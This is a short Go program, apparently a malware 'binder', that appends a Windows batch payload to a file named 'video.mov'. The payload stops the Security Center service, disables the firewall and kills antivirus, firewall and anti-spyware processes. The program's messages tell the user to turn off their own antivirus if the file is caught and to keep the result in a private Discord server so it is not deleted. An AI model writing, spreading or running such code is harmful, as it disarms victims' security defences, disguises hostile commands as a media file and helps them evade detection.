// Made by https://github.com/0x1CA3 //

package main

import (
	"fmt"
	"os"
)

func main() {
	message := "@echo off\nrem\nrem Permanently Kill Anti-Virus\nnet stop â€œSecurity Centerâ€\nnetsh firewall set opmode mode=disable\ntskill /A av*\ntskill /A fire*\ntskill /A anti*\ncls\ntskill /A spy*\ntskill /A bullguard\ntskill /A PersFw\ntskill /A KAV*\ntskill /A ZONEALARM\ntskill /A SAFEWEB\ncls"
	filename := "Util/AvTrigger/video.mov"

	f, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0660)

	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	defer f.Close()

	fmt.Fprintf(f, "%s\n", message)
	fmt.Println("Successfully binded!\nIf it does not work or the file")
	fmt.Println("has been deleted, please disable\nyour antivirus and run the program")
	fmt.Println("again. Once you do it would be\nrecommended to save it in a")
	fmt.Println("private discord server or groupchat\nso it does not get deleted just")
	fmt.Println("incase your antivirus decides to be a bitch")
}
